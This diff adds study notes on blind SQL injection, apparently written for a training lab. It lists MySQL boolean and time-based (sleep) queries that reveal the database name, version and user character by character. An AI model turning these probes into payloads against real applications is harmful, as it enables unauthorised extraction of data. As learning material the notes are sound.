@@ -1,0 +1,49 @@
+1- select (length (database())=5); ----> 0 means NO and 1 means YES
+    select (length (database())=6);
+
+2- select (version() like '7%');
+    select (version() like '10%'); 
+
+3- select (database()='security');
+    select (database()='mysql');
+
+4- select if ((select version() like '10%'),sleep(10),NULL);
+    select if ((select user() like '%admin%'),sleep(10),NULL);
+    select if ((select user() like '%root%'),sleep(10),NULL);  
+
+5- select if ((select database()='security'),sleep(10),NULL);
+    select if ((select database()='mysql'),sleep(10),NULL);
+
+6- select if ((length(database())=5),sleep(10),NULL);
+    select if ((length(database())=7),sleep(10),NULL);
+
+7- select if ((substr(database(),1,1)='m'),sleep(10),0);
+    select if ((substr(database(),2,1)='y'),sleep(10),0);
+    select if ((substr(database(),3,1)='s'),sleep(10),0);
+    select if ((substr(database(),4,1)='q'),sleep(10),0);
+    select if ((substr(database(),5,1)='l'),sleep(10),0);
+
+8- Ascii code [www.asciitable.com]
+   0 means ----NO
+   1 means ----YES
+   mysql> select ascii (substring(database(),1,1))=115;----->s
+   mysql> select ascii (substring(database(),1,1))=116;------> t
+   mysql> select ascii (substring(database(),1,1))=110;--------> n
+
+database_name: security: 115 - 101 - 99 - 117 - 114 - 105 - 116 - 121
+database_name: mysql: 109 - 121 - 115- 113 - 108
+
+   mysql> select ascii (substring(database(),1,1))=109;--->m
+   mysql> select ascii (substr(database(),2,1))=121;-------->y
+   mysql> select ascii (substring(database(),3,1))=115;----->s
+   mysql> select ascii (substring(database(),4,1))=113;---->q
+   mysql> select ascii (substring(database(),5,1))=108;-------->l
+
+
+
+
+
+
+
+
+
